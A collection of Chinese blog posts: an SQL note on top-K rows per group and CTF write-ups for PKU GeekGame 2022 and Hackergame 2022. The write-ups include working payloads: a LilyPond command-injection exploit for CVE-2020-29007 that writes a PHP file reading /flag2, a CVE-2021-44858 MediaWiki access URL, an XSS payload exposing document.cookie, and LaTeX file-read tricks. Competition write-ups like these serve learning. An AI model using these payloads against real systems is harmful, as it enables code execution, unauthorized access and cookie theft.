[{"categories":["技术笔记"],"content":"问题 这是个在半年前遇到的一个有趣的 SQL 查询问题，让我先描述一下： 假定我有一张表： CREATE TABLE foods ( id INT NOT NULL PRIMARY KEY AUTO_INCREMENT COMMENT '没啥意义的主键', category VARCHAR(10) COMMENT '类别', price INT COMMENT '价格' ); 我现在想知道每个 category 里面价格前 3 高的商品 id，能用一个查询解决吗？ 这个问题就是 N 个组中的 Top-K 问题。 ","date":"2023-01-03","objectID":"/post/a149ebee/:1:0","tags":["技术笔记","SQL"],"title":"SQL N 个组中的 Top-K 问题","uri":"/post/a149ebee/"},{"categories":["技术笔记"],"content":"窗口函数 DB Fiddle：https://dbfiddle.uk/0tkoovd2 如果你在用比较新的 MySQL/MariaDB 或者 PostgreSQL 的话，你可以用 over(partition by) 来分组，并用窗口函数来解决这个问题： SELECT id, category, price, ROW_NUMBER() OVER (PARTITION BY category ORDER BY price DESC) AS rn, RANK() OVER (PARTITION BY category ORDER BY price DESC) AS rk, DENSE_RANK() OVER (PARTITION BY category ORDER BY price DESC) AS drk FROM foods; 这里面三个窗口函数的含义： ROW_NUMBER()：从上往下，从 1 开始按行号排序。 RANK()：从上往下，根据 value 排序，其中并列的 rank 相同，并且会重复排名会占位（比如有两个第 5 名，那么第三个从第 7 名开始，而不是第 6 名。） DENSE_RANK()：同上，但是不跳过重复排名。 那么要解决上面这个问题，就非常简单了： SELECT w.id, w.category, w.price FROM ( SELECT id, category, price, ROW_NUMBER() OVER (PARTITION BY category ORDER BY price DESC) AS rn FROM foods ) w WHERE w.rn \u003c= 3; ","date":"2023-01-03","objectID":"/post/a149ebee/:2:0","tags":["技术笔记","SQL"],"title":"SQL N 个组中的 Top-K 问题","uri":"/post/a149ebee/"},{"categories":["技术笔记"],"content":"SQL 解法 DB Fiddle：https://dbfiddle.uk/0kwueEv8 当然，在种种情况下，可能你并没有这么方便的窗口函数可以用（比如一些 custom 的 SQL 实现或者在 Flink SQL 下的一些非标准 DBMS 环境），怎么用 SQL 解这个问题呢？ 我们先看一个求 RANK() 的例子： SELECT f.id, f.category, f.price, COUNT(af.price) + 1 AS rk FROM foods f LEFT JOIN foods af ON ( f.category = af.category AND f.price \u003c af.price ) GROUP BY f.id ORDER BY rk; 我们先看子查询：子查询做了一次 self join，f.category = af.category 实际上做了拆组的工作，保证在同组间做比较，而 f.price \u003c af.price 这条比较很关键，这使得对于任意一行数据，比当前数据大的 entry 都出现了一次。例如，假定我们的数据是 20, 30, 40, 50，则对于 30 这条 entry，我们的结果是 (30, 40), (30, 50)。我们很容易发现，实际上有几条数据，我们就排在第几名（一个简单的观察是，因为有 k 条比当前 entry 大的数据，所以他们都在前面，则当前数据自然排在第 k+1 名），所以，我们针对 af.price（注意到我们应该计数后面的数据，而不是这一行的比较基准 f.price）做一下 count 即可。由于我们的 Rank 基于 1 开始，所以我们需要加一。 这个情况对于重复数值有用吗？同样有用。考虑 20, 30, 30, 40, 50，对于 30，我们会有两组相同数据 (30, 40), (30, 50) 满足要求，所以都排在第 3 名，而对于 20，此时满足要求的行数有 4 行，则 20 排在第 5 名。 基于 RANK()，我们可以迅速发现，DENSE_RANK() 实际上将多个 30 当做一组处理，则在后一个例子中，我们对 af.price 去重即可。所以，DENSE_RANK() 的 SQL 很直观： SELECT f.id, f.category, f.price, COUNT(DISTINCT af.price) + 1 AS drk FROM foods f LEFT JOIN foods af ON ( f.category = af.category AND f.price \u003c af.price ) GROUP BY f.id ORDER BY drk; 而 ROW_NUMBER() 需要多一层注意：由于我们希望每一行都是递增的，则对于相同的行，我们还需要另一个东西来保序。通常来说，我们使用主键 id 来保序，不过如果有特殊需求，也可以变。 SELECT f.id, f.category, f.price, COUNT(af.price) + 1 AS rn FROM foods f LEFT JOIN foods af ON ( f.category = af.category AND ( f.price \u003c af.price OR ( f.price = af.price AND f.id \u003e af.id ) ) ) GROUP BY f.id ORDER BY rn; 我们直接修改 join 的条件即可：当两个值相等的时候，我们选择一个其他 key 决定顺序。注意到我们把下面的 f.id \u003e af.id 换成了大于号，其实是一个比较有趣的搞法：由于我们的前一个 f.id 有序，我们希望 f.id 更小的 entry 出现在前面，在最后的筛选时才能让 f.id 更大的包含更多结果。比如我们有 (1, 20), (2, 30), (3, 30), (4, 40), (5, 50)，我们期望让 (2, 30) 的 entry 只有两个，(3, 30) 的 entry 有三个，所以我们需要 f.id \u003e af.id，此时 (3, 30, 2, 30) 这条 entry 会被统计到后面，才能保证 (2, 30) 这条排在前面。 由于我们每一行都会有一个唯一 ROW_NUMBER()，所以我们不能插入 DISTINCT，不然重复值这一条的统计会出问题。 所以，我们要解决最初的问题，只需要对 rn 筛选一下即可： SELECT f.id, f.category, f.price, COUNT(af.price) + 1 AS rn FROM foods f LEFT JOIN foods af ON ( f.category = af.category AND ( f.price \u003c af.price OR ( f.price = af.price AND f.id \u003e af.id ) ) ) GROUP BY f.id HAVING rn \u003c= 3 ORDER BY rn; ","date":"2023-01-03","objectID":"/post/a149ebee/:3:0","tags":["技术笔记","SQL"],"title":"SQL N 个组中的 Top-K 问题","uri":"/post/a149ebee/"},{"categories":["技术笔记"],"content":"Reference MySQL 关于窗口函数的文档：https://dev.mysql.com/doc/refman/8.0/en/window-function-descriptions.html PostgreSQL 关于窗口函数的文档：https://www.postgresql.org/docs/current/functions-window.html 关于 SQL 解法的最初来源：https://stackoverflow.com/questions/2129693/using-limit-within-group-by-to-get-n-results-per-group/30269273#30269273 ","date":"2023-01-03","objectID":"/post/a149ebee/:4:0","tags":["技术笔记","SQL"],"title":"SQL N 个组中的 Top-K 问题","uri":"/post/a149ebee/"},{"categories":["趣题记录"],"content":"只做到周三，然后因为上班咕咕了，后面的很多题有了想法也没做，随便记一下。 ","date":"2022-11-26","objectID":"/post/8a92c50b/:0:0","tags":["GeekGame","逆向","Web","数学","CTF"],"title":"PKU GeekGame 2022 题解","uri":"/post/8a92c50b/"},{"categories":["趣题记录"],"content":"签到 听说跟去年一样。 经典 Windows 符号字体，copy 出来错位两行，随便搞下就行。 s = \"\"\"原文\"\"\" print(''.join(map(lambda x: x[0] + x[1], zip(*s.split('\\n'))))) ","date":"2022-11-26","objectID":"/post/8a92c50b/:1:0","tags":["GeekGame","逆向","Web","数学","CTF"],"title":"PKU GeekGame 2022 题解","uri":"/post/8a92c50b/"},{"categories":["趣题记录"],"content":"小北问答 · 极速版 问答部分，题目有 8 个，质数那个题应该需要猜一下，撞大运，所以没写。 PKU Runner：直接 zip 或者 http://www.javadecompilers.com/apk decompile 看下 manifest 就行了。 gStore：搜一下论文就能看到。 ctf.世界一流大学.com：要么直接转一下(IDNA Encoding)，要么直接 F12 访问一下就能看到 Host。 WebP：https://caniuse.com/webp。 BV 号：都是基于 mcfx 的 writeup，抄一份或者随便找个工具。 电子游戏概论：看下去年题目的 server 源码就能找到。 mac 地址：路由器因为各种原因会广播自己的 BSSID，去 https://www.wigle.net/ 搜一下，然后去地图上比划一下就有了。 然后就是经典大胖题，第一部分的输出是第二部分的输入。 from pwn import * import re HOST = \"prob01.geekgame.pku.edu.cn\" PORT = 10001 TOKEN = rb\"\" def solve(line): if 'PKU Runner' in line: return b'cn.edu.pku.pkurunner' if 'gStore' in line: return b'10.14778/2002974.2002976' if 'ctf' in line: return b'ctf.xn--4gqwbu44czhc7w9a66k.com' if 'WebP' in line: return b'65' if 'BV1EV411s7vu' in line: return b'418645518' if 'd2:94:35:21:42:43' in line: return b'80304' mg = re.match( r\"第 [0-9] 题：在第一届 PKU GeekGame 比赛的题目《电子游戏概论》中，通过第 ([0-9]+) 级关卡需要多少金钱？\", line) if mg: level = int(mg.group(1)) return str(300 + int(level**1.5) * 100).encode('utf8') return '' if __name__ == \"__main__\": r = connect(HOST, PORT) r.sendlineafter(b\"Please input your token: \", TOKEN, 1) r.sendlineafter(b\"\u003e \", \"急急急\".encode('utf8')) print('[+] Got connection.') for idx in range(7): prob = r.recvline_startswith( '第'.encode('utf8')).decode('utf8').strip('\\n') ans = solve(prob) if len(ans) == 0: print('[!] Invalid problem.') print(f'[!] Problem: {prob}') exit(0) r.sendlineafter(b\"\u003e \", ans) line = r.recvline() if line.decode('utf8').strip('\\n') != \"鉴定为：答案正确。\": print('[!] Fatal!') print(f'[!] Problem: {prob}') print(f'[!] Answer: {ans.decode(\"utf8\")}') print(f'[!] Predict: {line.decode(\"utf8\")}') exit(0) print(f'[+] Problem {idx+1}: success.') print(f'[+] All done!') print(f'[+] Remain: {r.recvall().decode(\"utf8\")}') ","date":"2022-11-26","objectID":"/post/8a92c50b/:2:0","tags":["GeekGame","逆向","Web","数学","CTF"],"title":"PKU GeekGame 2022 题解","uri":"/post/8a92c50b/"},{"categories":["趣题记录"],"content":"编译原理习题课 ","date":"2022-11-26","objectID":"/post/8a92c50b/:3:0","tags":["GeekGame","逆向","Web","数学","CTF"],"title":"PKU GeekGame 2022 题解","uri":"/post/8a92c50b/"},{"categories":["趣题记录"],"content":"玩挺大 搞个栈上数组就行了，记得确保初始化，不然可能会有优化 trick。 一开始我搞了个 main[-1u]{1}，结果太大了被拒绝编译了。 long long array[2000000]{1}; int main() { return 0; } //EOF ","date":"2022-11-26","objectID":"/post/8a92c50b/:3:1","tags":["GeekGame","逆向","Web","数学","CTF"],"title":"PKU GeekGame 2022 题解","uri":"/post/8a92c50b/"},{"categories":["趣题记录"],"content":"玩挺长 经典 Codegolf。 #include __FILE__ #include __FILE__ //EOF ","date":"2022-11-26","objectID":"/post/8a92c50b/:3:2","tags":["GeekGame","逆向","Web","数学","CTF"],"title":"PKU GeekGame 2022 题解","uri":"/post/8a92c50b/"},{"categories":["趣题记录"],"content":"玩挺花 找个 Bug 或者 CVE 就可以了。我找到的是这个。 void operator\"\"_x(const char *, unsigned long); static_assert(false, \"foo\"_x); //EOF ","date":"2022-11-26","objectID":"/post/8a92c50b/:3:3","tags":["GeekGame","逆向","Web","数学","CTF"],"title":"PKU GeekGame 2022 题解","uri":"/post/8a92c50b/"},{"categories":["趣题记录"],"content":"Flag Checker ","date":"2022-11-26","objectID":"/post/8a92c50b/:4:0","tags":["GeekGame","逆向","Web","数学","CTF"],"title":"PKU GeekGame 2022 题解","uri":"/post/8a92c50b/"},{"categories":["趣题记录"],"content":"Flag1 Flag 被 Rot13 过，reverse 回去然后 base64 解一下就行。 ","date":"2022-11-26","objectID":"/post/8a92c50b/:4:1","tags":["GeekGame","逆向","Web","数学","CTF"],"title":"PKU GeekGame 2022 题解","uri":"/post/8a92c50b/"},{"categories":["趣题记录"],"content":"Flag2 审计代码。 // codes... ScriptEngineManager var2 = new ScriptEngineManager(); ScriptEngine var3 = var2.getEngineByName(\"nashorn\"); try { String var4 = \"\"; StringBuilder var8 = new StringBuilder(); for(int var9 = 0; var9 \u003c var4.length(); ++var9) { var8.append((char)(var4.charAt(var9) ^ 239)); } var3.eval(var8.toString()); } // codes... else { Object var6 = this.invocable.invokeFunction(var1.getSource() == this.button2 ? \"checkflag2\" : \"checkflag3\", new Object[]{this.textField1.getText()}); } // codes... 搜索得知 nashorn 是个 js 脚本引擎，逻辑把输入喂进 var4 处理之后的脚本，然后调用 checkflag2。 处理完的 js 被混淆过，拖进 de4js 自动解不了，手修了一下。 function checkflag2(input) { return (JSON.stringify(input.split('').map(function (x) { return x.charCodeAt(0) })) == JSON.stringify([0, 15, 16, 17, 30, 105, 16, 31, 16, 67, 3, 33, 5, 60, 4, 106, 6, 41, 0, 1, 67, 3, 16, 4, 6, 33, 232].map(function (x) { return (checkflag2 + '').charAt(x) })) ? 'Correct' : 'Wrong') } 最后把原始函数对应位置的字符抽出来 join 一下就是 flag。 ","date":"2022-11-26","objectID":"/post/8a92c50b/:4:2","tags":["GeekGame","逆向","Web","数学","CTF"],"title":"PKU GeekGame 2022 题解","uri":"/post/8a92c50b/"},{"categories":["趣题记录"],"content":"企鹅文档 进去随便玩一下，发现几个空白单元格的文字会一闪而过，所以猜测是 client 侧的权限验证。 用 Burpsuite 或者 Chrome Devtools 直接跟一下请求，搜索 机密，发现核心 api 是 /dop-api/opendoc 和 /dop-api/get/sheet。分析下包结构就能拼出来链接了。 第二部分跟第一部分原理一样，从搜出来的请求里面正确找到构成 flag 图形的请求，想办法可视化一下就行，我的搞法是导出到了一个 CSV。 ","date":"2022-11-26","objectID":"/post/8a92c50b/:5:0","tags":["GeekGame","逆向","Web","数学","CTF"],"title":"PKU GeekGame 2022 题解","uri":"/post/8a92c50b/"},{"categories":["趣题记录"],"content":"私有笔记 ","date":"2022-11-26","objectID":"/post/8a92c50b/:6:0","tags":["GeekGame","逆向","Web","数学","CTF"],"title":"PKU GeekGame 2022 题解","uri":"/post/8a92c50b/"},{"categories":["趣题记录"],"content":"知识，与你分享 先看版本，1.34.4 发布在 2020，意味着可能会有很多漏洞可以抓。随便搜了下发现 CVE-2021-44858，直接越权访问文档，查看首页版本 2 就行。 https://prob07-\u003cenv\u003e.geekgame.pku.edu.cn/index.php?title=%E9%A6%96%E9%A1%B5\u0026action=mcrundo\u0026undo=1\u0026undoafter=2 ","date":"2022-11-26","objectID":"/post/8a92c50b/:6:1","tags":["GeekGame","逆向","Web","数学","CTF"],"title":"PKU GeekGame 2022 题解","uri":"/post/8a92c50b/"},{"categories":["趣题记录"],"content":"来我家做客吧 登录进去先随便玩下，没啥东西。重新看版本，发现有个很刻意的扩展 Lilypond，直接搜一下就找到 CVE-2020-29007 和对应的讨论地址。读一下，然后 fuzz 一下就行。我的搞法是新建一个 test.php，直接 include flag2 文件，然后访问一下就有了。 \u003cscore\u003e\\new Staff \u003c\u003c{c^# (object-\u003estring (system \"echo \\\"\u003c?php echo file_get_contents('/flag2') ?\u003e\\\" \u003e /var/www/html/test.php\")) }\u003e\u003e\u003c/score\u003e ","date":"2022-11-26","objectID":"/post/8a92c50b/:6:2","tags":["GeekGame","逆向","Web","数学","CTF"],"title":"PKU GeekGame 2022 题解","uri":"/post/8a92c50b/"},{"categories":["趣题记录"],"content":"这也能卷 ","date":"2022-11-26","objectID":"/post/8a92c50b/:7:0","tags":["GeekGame","逆向","Web","数学","CTF"],"title":"PKU GeekGame 2022 题解","uri":"/post/8a92c50b/"},{"categories":["趣题记录"],"content":"Flag · 摆 一开始看了十分钟后端，发现咋没前端代码，然后想起来应该 F12 的。 审计一下前端： if (localStorage.getItem('i_am_premium_user') === 'true') { import('./main-premium.js') } localStorage 随便改的，改了刷新一下就能看到 Flag。 ","date":"2022-11-26","objectID":"/post/8a92c50b/:7:1","tags":["GeekGame","逆向","Web","数学","CTF"],"title":"PKU GeekGame 2022 题解","uri":"/post/8a92c50b/"},{"categories":["趣题记录"],"content":"381654729 搜了下为什么这个数很特殊，发现是一个 Polydivisiable Number，然后审计了一下代码，找一个 16 进制的 Polydivisiable Number。 先尝试按大端序拆一下需要异或这个数，发现最终的 byte 长度应该是 24，然后前面四个 byte 已经是 flag 了，那应该是后面 20 位，由于 xor 的关系，按 byte 分块之后各块没有关联，直接逐个块搜索一下就行。 from string import printable B = 2511413510786744827187994827731403682185299073590935188882 def hl(num: int) -\u003e int: return len(hex(num)) - 2 def gl(num: int) -\u003e int: return (B \u003e\u003e ((hl(B) - hl(num)) * 4)) ^ num def verify(num: int) -\u003e bool: l = hl(num) for i in range(1, l + 1): if (num \u003e\u003e ((l - i) * 4)) % i \u003e 0: return False return True def dfs(cur): if hl(cur) == 48: if cur % 256 == ord('}'): return cur for i in printable[:-6]: nxt = (cur \u003c\u003c 8) + ord(i) if verify(gl(nxt)): if (ret := dfs(nxt)) \u003e 0: return ret return -1 if __name__ == \"__main__\": num = 0x666c61677b # flag{ print(dfs(num).to_bytes(24, 'big')) ","date":"2022-11-26","objectID":"/post/8a92c50b/:8:0","tags":["GeekGame","逆向","Web","数学","CTF"],"title":"PKU GeekGame 2022 题解","uri":"/post/8a92c50b/"},{"categories":["趣题记录"],"content":"今年又来了，由于这次很多题目 fuzz 部分非常多，本拍脑袋选手蒙出来不少可以做的东西，分数+排名都比去年好了很多，很开心。 ","date":"2022-10-28","objectID":"/post/6918ebb9/:0:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"签到 我点进去的时候网比较烂，只看到一个提交按钮，点了下发现 url 有个 result=???? 的 query，试了试 2022 就过了。 后面我又点进去才知道是 wasm 搞了个 MNIST，还挺牛。 ","date":"2022-10-28","objectID":"/post/6918ebb9/:1:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"猫咪问答喵 比去年难多了。 搜索。 听力考试，凭借我强大的脑补能力猜出来了是 Kdenlive。 直接搜 “firefox windows 2000”，有用户说 28 也能跑，试了下不对，官方支持是 12，改成 12 就对了。 搜索 “kernel argc non zero”，能找到 LWN.net 的讨论，从下面找到核心 patch 的修改点然后直接去 Github 找到 kernel 的 fs/exec.c 文件 对应位置，git blame 一下拿到 commit hash。 找了很久，最后在 Github 代码搜索 搜 hash，搜到个 ip，点进去一看域名确实是。 搜索“网络通”，从 FAQ 里面看到这个通知的名字是 《中国科学技术大学校园网络运行及通信费用分担办法》，搜索这个关键词，从中科大网络信息中心的文件扫描页面发现这种文件都是网字头，顺着找一下就能找到正式施行的文件，拿到时间。 ","date":"2022-10-28","objectID":"/post/6918ebb9/:2:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"家目录里的秘密 ","date":"2022-10-28","objectID":"/post/6918ebb9/:3:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"VS Code 里的 flag grep -ir 'flag' ./* ","date":"2022-10-28","objectID":"/post/6918ebb9/:3:1","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"Rclone 里的 flag /home/user/.config/rclone/rclone.conf 里面有个 pass，不知道是啥，搞个 rclone 源码审计了一下，发现有个 obscure 命令，然后下面刚好有个 Reveal 函数，直接 copy 出来跑一遍就出 flag 了。 ","date":"2022-10-28","objectID":"/post/6918ebb9/:3:2","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"HeiLang %s/|/,/g，然后把前面的实现改成： class A: def __init__(self): self.a = [0] * 10000 def __setitem__(self, idx, val): if isinstance(idx, int): self.a[idx] = val elif isinstance(idx, tuple): for item in idx: self.a[item] = val # a = [0] * 10000 a = A() # ... if __name__ == \"__main__\": get_flag(a.a) 直接跑就出结果了。 ","date":"2022-10-28","objectID":"/post/6918ebb9/:4:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"Xcaptcha 打开点进去，页面一闪而过，用 requests + BeautifulSoup 交互式 parse 一下页面，然后把答案提交了就行。 import requests from bs4 import BeautifulSoup URL = \"http://202.38.93.111:10047\" TOKEN = \"\"\"\u003cYour Token\u003e\"\"\" if __name__ == \"__main__\": s = requests.session() r = s.get(URL, params={\"token\": TOKEN}) r = s.get(f\"{URL}/xcaptcha\") soup = BeautifulSoup(r.text, features=\"html.parser\") answers = map(lambda x: eval(x.string.rstrip(\" 的结果是？\")), soup.findAll(\"label\")) data = {} for idx, answer in enumerate(answers): data[f\"captcha{idx+1}\"] = answer r = s.post(f\"{URL}/xcaptcha\", data=data) print(r.text) ","date":"2022-10-28","objectID":"/post/6918ebb9/:5:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"旅行照片 2.0 ","date":"2022-10-28","objectID":"/post/6918ebb9/:6:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"图片分析 下载下来直接右键 -\u003e 显示简介，答案都在上面。 ","date":"2022-10-28","objectID":"/post/6918ebb9/:6:1","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"社工入门 酒店 放大图片能看到 WELCOME TO ZOZOMARINE STADIUM，搜了下在日本千叶，虽然根据方位 Google Map 显示了三个可能的酒店，但是这一街区的邮编都是一个。 EXIF 信息看到这个设备是 Xiaomi sm6115 (juice)，国内版本型号是红米 Note 9 4G，随便找个 spec 就能找到分辨率了，长宽别写反了。 航班 因为担心改航线，搜了好几个能看历史航班信息的，找了个便宜的开了个 7 天试用，比划半天找到了。（事后想了想，反正是免费试用，找便宜的意义在哪儿？） ","date":"2022-10-28","objectID":"/post/6918ebb9/:6:2","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"猜数字 一开始是猜可能要多线程撞 ConcurrentHashMap 或者是 XML Encoding 上搞些花活，最后发现： var guess = Double.parseDouble(event.asCharacters().getData()); var isLess = guess \u003c this.number - 1e-6 / 2; var isMore = guess \u003e this.number + 1e-6 / 2; var isPassed = !isLess \u0026\u0026 !isMore; 根据 IEEE 754 标准，NaN 上的一切比较都是 false，这里的答案解析方式是接受 NaN 的，而 NaN 后 isLess 和 isMore 就恒为 false，然后就绕过去了。 去网页上试了试，发现不接受非数字输入，所以最后 curl 两行流了。 export TOKEN='\u003cYOUR TOKEN\u003e' curl 'http://202.38.93.111:18000/state' -H \"Authorization: Bearer ${TOKEN}\" --data-raw '\u003cstate\u003e\u003cguess\u003eNaN\u003c/guess\u003e\u003c/state\u003e' curl -H \"Authorization: Bearer ${TOKEN}\" 'http://202.38.93.111:18000/state' ","date":"2022-10-28","objectID":"/post/6918ebb9/:7:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"LaTeX 机器人 ","date":"2022-10-28","objectID":"/post/6918ebb9/:8:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"纯文本 \\texttt{\\input{/flag1}} ","date":"2022-10-28","objectID":"/post/6918ebb9/:8:1","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"特殊字符混入 根据文档，\\input 的操作跟 C 的 #include 很像，直接把内容从文件 copy 过来然后当文档的一部分编译。搜了很久怎么在 document 里面插入新的 document 然后引入 \\verbatiminput，然后发现一个命令 \\catcode，可以修改一个字符的 category code，那直接把 # 和 _ 都改成字符的类型就可以了。 \\catcode`\\_=11 \\catcode`\\#=11 \\texttt{\\input{/flag2}} ","date":"2022-10-28","objectID":"/post/6918ebb9/:8:2","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"Flag 的痕迹 打开 DokuWiki 官网，进任意页面的 revisions 随便玩一下就会发现，带参数 do=diff 就可以打开两个页面的 diff，回来对主页 diff 一下就做完了。 ","date":"2022-10-28","objectID":"/post/6918ebb9/:9:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"安全的在线测评 ","date":"2022-10-28","objectID":"/post/6918ebb9/:10:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"无法 AC 的题目 看了下判题脚本，static.out 文件并没有特殊的权限设置，猜测可以直接读，随便写个读文件的 C 代码就过了。 ","date":"2022-10-28","objectID":"/post/6918ebb9/:10:1","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"动态数据 重新审计判题脚本，发现实际的数据生成是脚本里面做的，然后 gcc 也是脚本起的，所以 gcc 有读数据的权限。想办法从编译下手。 首先第一个想到的是 #include，但是 #include 从工作原理上来说会对文件做操作，而 dynamic.out 都是两行的大数字，不是标准 C 文件，调了半个小时放弃。 然后胡乱搜索，最终发现了这篇文章，里面提到可以用 .incbin 这个 inline asm 编译期包含文件。 然后这题就做完了？没有。由于我的汇编水平相比去年长进十分有限（$|\\Delta| \u003c \\epsilon$），我照着这篇文章和 Stackoverflow 的好多回答抄的代码都 crash 了。然后我搜到了这个项目，发现是 500 行的 header-only，直接 copy 交了，然后 WA 了。重新读了遍代码，发现是没判断输入，一把子全输出了，直接把打 ACM 的经验全部扔了，改改然后 fuzz 一下就过了。 // 这里应该有上面仓库提到的 .h #include \u003cstdio.h\u003e INCTXT(stt, \"./data/static.out\"); INCTXT(dy0, \"./data/dynamic0.out\"); INCTXT(dy1, \"./data/dynamic1.out\"); INCTXT(dy2, \"./data/dynamic2.out\"); INCTXT(dy3, \"./data/dynamic3.out\"); INCTXT(dy4, \"./data/dynamic4.out\"); INCTXT(sttIn, \"./data/static.in\"); INCTXT(dy0In, \"./data/dynamic0.in\"); INCTXT(dy1In, \"./data/dynamic1.in\"); INCTXT(dy2In, \"./data/dynamic2.in\"); INCTXT(dy3In, \"./data/dynamic3.in\"); INCTXT(dy4In, \"./data/dynamic4.in\"); int main() { char input[2000]; scanf(\"%s\", input); int l = strlen(input); input[l] = '\\n'; input[l + 1] = '\\0'; if (strcmp(input, gsttInData) == 0) { printf(\"%s\", gsttData); return 0; } if (strcmp(input, gdy0InData) == 0) { printf(\"%s\", gdy0Data); return 0; } if (strcmp(input, gdy1InData) == 0) { printf(\"%s\", gdy1Data); return 0; } if (strcmp(input, gdy2InData) == 0) { printf(\"%s\", gdy2Data); return 0; } if (strcmp(input, gdy3InData) == 0) { printf(\"%s\", gdy3Data); return 0; } if (strcmp(input, gdy4InData) == 0) { printf(\"%s\", gdy4Data); return 0; } } ","date":"2022-10-28","objectID":"/post/6918ebb9/:10:2","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"线路板 下载 Kicad，所有文件导入进去，当 Photoshop 玩一下就能看到了。 ","date":"2022-10-28","objectID":"/post/6918ebb9/:11:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"Flag 自动机 今年学习了一手渗透测试，然后我终于调好了能下断点的 IDA 了，但是一次都没用过。 下载了 flag_machine.exe 先玩了一下，大概有个思路打开 IDA 看了下，工作方式比较简单，进来直接搞了个窗口程序就跑了。审计一下窗口初始化的伪代码： 核心的消息收发函数应该是 WndClass.lpfnWndProc，直接审计 sub_401510。 进来看了下这里有个 Congratulations，看了下下面直接把 flag 写到文件了，那么 sub_401F8A 应该就可以直接把 flag 吐出来。进去看下： 发现 flag 会先被放到 Destination 里，然后 return 回去，那跑下 401F8A 应该就可以了。 找到地址，结果刚启动 debugger 就 crash 了。找了各种教程，发现用 windbg 也 crash，一通搜索之后发现好像是 anti-debug 了，跟着教程搞了个 Ollydbg，然后又找到个插件 ScyllaHide，配完了进去跑，啥问题没有。直接把 EIP 改成 0x401f8a，然后执行一下，就能在内存上看到 flag 了。 ","date":"2022-10-28","objectID":"/post/6918ebb9/:12:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"微积分计算小练习 看了下执行脚本，应该是需要通过 XSS 给 cookie 弄出来。试了下容器里没有网，掉头看第一个页面。 第一个页面里随便玩了几次，发现输入相同的 input 吐出来的结果是一样的，把 result= 后面的 value 拖进 CyberChef 然后 URL decode 了一下，自动检测出来是 base64 过后的 score:username 数据。 审计了一下前端代码，发现这两个地方直接做的 HTML 拼接，那都有注入点。fuzz 了一下得到一个可行的 payload： \u003ca href=\"x\" onfocus=\"document.querySelector('#greeting').textContent=document.cookie;\" autofocus=\"\"\u003exss\u003c/a\u003e:123 转成 base64，encoding 完了拼一下链接，交了就过了。 ","date":"2022-10-28","objectID":"/post/6918ebb9/:13:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"杯窗鹅影 ","date":"2022-10-28","objectID":"/post/6918ebb9/:14:0","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"flag1 拉了个镜像，随便写了个读文件的代码，编译完交了就过了…… #include \u003cstdio.h\u003e int main() { FILE *f = fopen(\"/flag1\", \"r\"); int c = fgetc(f); while (c != EOF) { putchar(c); c = fgetc(f); } fclose(f); } ","date":"2022-10-28","objectID":"/post/6918ebb9/:14:1","tags":["Hackergame","Web","逆向","数学","CTF"],"title":"Hackergame 2022 题解","uri":"/post/6918ebb9/"},{"categories":["趣题记录"],"content":"flag2 Wine 本身并不是搞了个 sandbox 或者 vm 之类的东西，而是相当于当你调用 Win32api 的时候，link 到的库是 Wine 的库，Wine 提供了这些函数在 Linux 下的等价（或者说勉强能用）的实现，然后直接跑，而至于原生 Linux 函数就直接 passthrough 了。 虽然这些我都知道，但是做的非常磕绊。因为第一问给了我一个错觉，以为直接 syscall 就行了，尝试直接 execve，发现跑不起来，然后尝试了一众 Windows API，比如 CreateProcess, ShellExecute 等等，都找不到资源，然后根据第一问的 flag 